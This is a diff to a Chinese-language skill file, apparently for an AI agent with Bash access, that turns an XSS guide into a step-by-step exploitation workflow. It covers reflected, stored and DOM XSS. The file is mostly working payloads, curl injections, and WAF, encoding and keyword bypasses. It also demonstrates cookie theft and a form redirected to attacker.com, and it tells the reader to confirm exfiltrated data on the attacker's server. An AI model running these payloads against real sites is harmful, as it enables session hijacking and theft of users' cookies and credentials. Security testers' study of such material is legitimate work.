@@ -1,6 +1,6 @@
 ---
 name: xss
-description: 跨站脚本漏洞检测与利用。当目标存在用户输入反射、评论功能、搜索框、URL 参数显示时使用。包括反射型、存储型、DOM XSS。
+description: "跨站脚本漏洞检测与利用。注入测试 payload、识别反射点、绕过 WAF 过滤器、验证弹窗执行并演示 cookie 窃取。当目标存在用户输入反射、评论功能、搜索框、URL 参数显示或富文本渲染时使用。"
 allowed-tools: Bash, Read, Write
 ---
 
@@ -8,78 +8,105 @@ allowed-tools: Bash, Read, Write
 
 通过在网页中注入恶意脚本，在用户浏览器中执行，实现会话劫持、钓鱼攻击或恶意操作。
 
-## 常见指示器
+## 决策流程
 
-- 用户输入直接反射到页面（搜索框、评论、用户名显示）
+根据输入反射的上下文选择攻击策略：
+
+```
+输入反射在哪个上下文？
+├── HTML 正文 → 使用 script 标签或事件处理器 payload（见"反射型 XSS"）
+├── HTML 属性内 → 闭合属性 + 注入事件处理器（见"属性注入"）
+├── JavaScript 代码内 → 闭合字符串 + 注入代码（见"JavaScript 上下文"）
+├── URL/href 属性内 → 使用 javascript: 伪协议（见"伪协议注入"）
+└── 被过滤/编码？
+    ├── 是 → 尝试绕过技术（见"绕过技术"）
+    └── 有 CSP？ → 见 CSP_BYPASS_REFERENCE.md
+```
+
+## 工作流程
+
+### 步骤 1：侦察 — 识别注入点
+
+寻找用户输入反射到页面的位置：
+
+- 搜索框、评论区、用户名显示
 - URL 参数直接显示在页面中
 - 富文本编辑器或 Markdown 渲染
 - 错误信息包含用户输入
 - JSON 响应被直接渲染
 - SVG/XML 文件上传
 
-## 检测方法
+```bash
+# 注入唯一标记并检查反射
+curl -s "http://target.com/search?q=UNIQUE_XSS_MARKER_12345" | grep "UNIQUE_XSS_MARKER_12345"
+```
 
-### 1. 基础测试
+**验证检查点**：确认标记字符串在响应中原样出现。记录反射位置（HTML 正文、属性、JS 代码内）。
+
+### 步骤 2：上下文识别与基础测试
+
+根据反射位置确定上下文，选择对应的初始 payload：
 
 ```bash
-# 简单 payload
+# HTML 上下文 — 直接注入标签
 curl "http://target.com/search?q=<script>alert(1)</script>"
 
-# 事件处理器
-curl "http://target.com/search?q=<img src=x onerror=alert(1)>"
+# 属性上下文 — 闭合属性后注入事件
+curl "http://target.com/search?q=\"+onmouseover=\"alert(1)"
 
-# SVG
-curl "http://target.com/search?q=<svg onload=alert(1)>"
+# JavaScript 上下文 — 闭合字符串后注入代码
+curl "http://target.com/search?q=';alert(1)//"
+
+# URL 上下文 — 伪协议
+curl "http://target.com/redirect?url=javascript:alert(1)"
 ```
 
-### 2. 上下文检测
+**验证检查点**：检查响应中 payload 是否被原样反射、被编码还是被过滤。据此决定是否需要绕过技术。
 
-```bash
-# HTML 上下文
-<script>alert(1)</script>
+### 步骤 3：攻击执行
 
-# 属性上下文
-" onmouseover="alert(1)
+#### 反射型 XSS
 
-# JavaScript 上下文
-';alert(1)//
-
-# URL 上下文
-javascript:alert(1)
-```
-
-## 攻击向量
-
-### 反射型 XSS
+**script 标签** — 最直接的注入方式，适用于无过滤的 HTML 上下文：
 
 ```html
-<!-- 基础 payload -->
 <script>alert('XSS')</script>
 <script>alert(document.domain)</script>
 <script>alert(document.cookie)</script>
+```
 
-<!-- 事件处理器 -->
+**事件处理器** — 当 `<script>` 被过滤时使用，利用 HTML 元素的事件属性：
+
+```html
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 <body onload=alert(1)>
 <input onfocus=alert(1) autofocus>
-<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
 <video src=x onerror=alert(1)>
 <audio src=x onerror=alert(1)>
-<details open ontoggle=alert(1)>
-<iframe onload=alert(1)>
+```
 
-<!-- 伪协议 -->
+**伪协议** — 适用于注入点在 href/src/action 等 URL 属性中：
+
+```html
 <a href="javascript:alert(1)">click</a>
 <iframe src="javascript:alert(1)">
 <form action="javascript:alert(1)"><input type=submit>
+```
 
-<!-- 数据 URI -->
+**数据 URI** — 当 javascript: 被过滤但 data: 未被限制时：
+
+```html
 <a href="data:text/html,<script>alert(1)</script>">click</a>
 <iframe src="data:text/html,<script>alert(1)</script>">
 ```
 
-### 存储型 XSS
+**验证检查点**：确认浏览器弹出 alert 对话框或执行了 `document.domain`/`document.cookie` 调用。
+
+#### 存储型 XSS
+
+输入被持久化存储（评论、个人资料等），影响所有访问该页面的用户：
 
 ```html
 <!-- Cookie 窃取 -->
@@ -100,68 +127,60 @@ document.forms[0].action='http://attacker.com/phish'
 </script>
 ```
 
-### DOM XSS
+**验证检查点**：刷新页面确认 payload 仍然存在并执行。在攻击者服务器上确认收到外泄数据。
 
-```javascript
-// 常见 sink 点
-document.write(location.hash)
-element.innerHTML = location.search
-eval(location.hash.slice(1))
-setTimeout(location.hash.slice(1))
-element.src = location.search.split('=')[1]
+#### 属性注入
 
-// 利用 payload
-#<script>alert(1)</script>
-?default=<script>alert(1)</script>
-#';alert(1)//
-```
-
-### 属性注入
+当注入点在 HTML 属性值内时，先闭合属性再注入：
 
 ```html
-<!-- 闭合属性 -->
+<!-- 闭合属性后注入事件 -->
 " onmouseover="alert(1)
 ' onfocus='alert(1)' autofocus='
-" onclick="alert(1)"
-
-<!-- 事件属性 -->
 " autofocus onfocus="alert(1)
-" onmouseover="alert(1)" x="
-' accesskey='x' onclick='alert(1)' x='
 
-<!-- href/src 属性 -->
+<!-- href/src 属性替换 -->
 javascript:alert(1)//
 data:text/html,<script>alert(1)</script>
 ```
 
-### 特殊标签
+#### DOM XSS
+
+客户端 JavaScript 将不可信数据传入危险 API。详细的 Source/Sink 列表见 `DOM_XSS_REFERENCE.md`。
+
+```javascript
+// 常见利用 payload
+#<img src=x onerror=alert(1)>
+?default=<script>alert(1)</script>
+#';alert(1)//
+```
+
+**验证检查点**：使用浏览器开发者工具确认 DOM 被修改，payload 在客户端执行。
+
+#### 特殊标签注入
 
 ```html
 <!-- SVG -->
 <svg><script>alert(1)</script></svg>
 <svg onload=alert(1)>
 <svg><animate onbegin=alert(1)>
-<svg><set onbegin=alert(1)>
 
 <!-- MathML -->
 <math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>
-
-<!-- 模板 -->
-<template><script>alert(1)</script></template>
-<xmp><script>alert(1)</script></xmp>
 ```
 
-## 绕过技术
+### 步骤 4：绕过技术
 
-### 大小写混合
+当基础 payload 被过滤时，逐步升级绕过手段：
+
+#### 大小写混合
 
 ```html
 <ScRiPt>alert(1)</ScRiPt>
 <IMG SRC=x OnErRoR=alert(1)>
-<SVG ONLOAD=alert(1)>
 ```
 
-### 编码绕过
+#### 编码绕过
 
 ```html
 <!-- HTML 实体 -->
@@ -171,43 +190,34 @@ data:text/html,<script>alert(1)</script>
 <!-- Unicode -->
 <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
 
-<!-- URL 编码 -->
+<!-- URL 编码 / 双重编码 -->
 <a href="javascript:%61%6c%65%72%74(1)">click</a>
-
-<!-- 双重编码 -->
 %253Cscript%253Ealert(1)%253C/script%253E
 ```
 
-### 标签变形
+#### 标签变形
 
 ```html
-<!-- 空格替代 -->
+<!-- 空格替代（/、Tab） -->
 <img/src=x/onerror=alert(1)>
 <svg/onload=alert(1)>
-<img	src=x	onerror=alert(1)>
 
-<!-- 换行 -->
+<!-- 换行分隔 -->
 <img src=x
 onerror=alert(1)>
-
-<!-- 注释 -->
-<script>al/**/ert(1)</script>
 
 <!-- 不常见标签 -->
 <details open ontoggle=alert(1)>
 <marquee onstart=alert(1)>
-<meter onmouseover=alert(1)>0</meter>
-<keygen onfocus=alert(1) autofocus>
 ```
 
-### 过滤绕过
+#### 关键字绕过
 
 ```html
-<!-- script 被过滤 -->
+<!-- script 被过滤 — 嵌套绕过 -->
 <scr<script>ipt>alert(1)</scr</script>ipt>
-<scr\x00ipt>alert(1)</script>
 
-<!-- alert 被过滤 -->
+<!-- alert 被过滤 — 替代函数 -->
 <script>confirm(1)</script>
 <script>prompt(1)</script>
 <script>[].constructor.constructor('alert(1)')()</script>
@@ -222,28 +232,18 @@ onerror=alert(1)>
 <script>alert(String.fromCharCode(88,83,83))</script>
 ```
 
-### CSP 绕过
+**验证检查点**：每次尝试绕过后检查响应，确认 payload 未被过滤且能执行。
 
-```html
-<!-- 利用白名单域名 -->
-<script src="https://allowed-cdn.com/angular.js"></script>
-<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
+### 步骤 5：CSP 绕过（如适用）
 
-<!-- base 标签劫持 -->
-<base href="http://attacker.com/">
+检查目标 CSP 策略并选择绕过方式。详细方法见 `CSP_BYPASS_REFERENCE.md`。
 
-<!-- 利用 nonce 泄露 -->
-<script nonce="leaked-nonce">alert(1)</script>
-
-<!-- 利用 unsafe-inline -->
-<script>alert(1)</script>
-
-<!-- DNS 预取泄露 -->
-<link rel="dns-prefetch" href="//attacker.com">
-<link rel="prefetch" href="//attacker.com">
+```bash
+# 检查 CSP 头
+curl -sI "http://target.com" | grep -i "content-security-policy"
 ```
 
-## XSS 工具
+## 工具辅助
 
 ### XSStrike
 
@@ -257,84 +257,15 @@ python3 xsstrike.py -u "http://target.com/search" --data "q=test"
 # 爬虫模式
 python3 xsstrike.py -u "http://target.com" --crawl
 
-# 绕过 WAF
+# WAF 绕过模式
 python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
-```
-
-### 手动测试
-
-```bash
-# 使用 curl 测试
-curl "http://target.com/search?q=<script>alert(1)</script>"
-
-# 检查响应中的反射
-curl -s "http://target.com/search?q=UNIQUE_STRING" | grep "UNIQUE_STRING"
-
-# 测试编码
-curl "http://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
-```
-
-## DOM XSS 检测
-
-### 危险 Source
-
-```javascript
-// URL 相关
-location
-location.href
-location.search
-location.hash
-location.pathname
-document.URL
-document.documentURI
-document.referrer
-
-// 存储相关
-localStorage
-sessionStorage
-
-// 消息相关
-window.name
-postMessage
-```
-
-### 危险 Sink
-
-```javascript
-// 执行代码
-eval()
-setTimeout()
-setInterval()
-Function()
-execScript()
-
-// HTML 注入
-innerHTML
-outerHTML
-document.write()
-document.writeln()
-
-// URL 跳转
-location
-location.href
-location.assign()
-location.replace()
-window.open()
-
-// 其他
-element.src
-element.href
-jQuery.html()
-jQuery.append()
 ```
 
 ## 最佳实践
 
-1. 先用简单 payload 测试: `<script>alert(1)</script>`
-2. 如果被过滤，尝试事件处理器: `<img src=x onerror=alert(1)>`
-3. 检查 CSP 头，可能需要绕过
-4. DOM XSS 需要分析 JavaScript 代码
-5. 注意上下文：HTML、属性、JavaScript、URL
-6. 使用不同编码绕过过滤
-7. 测试不常见标签和事件
-8. 检查是否有 WAF，使用绕过技术
+1. 先注入唯一标记确认反射，再尝试实际 payload
+2. 从简单 payload 开始，逐步升级到编码/绕过
+3. 始终确认注入上下文（HTML/属性/JS/URL）再选择 payload
+4. 检查 CSP 和 WAF，针对性选择绕过策略
+5. 存储型 XSS 优先级高于反射型 — 影响范围更大
+6. 每次注入后验证执行结果，不要假设成功
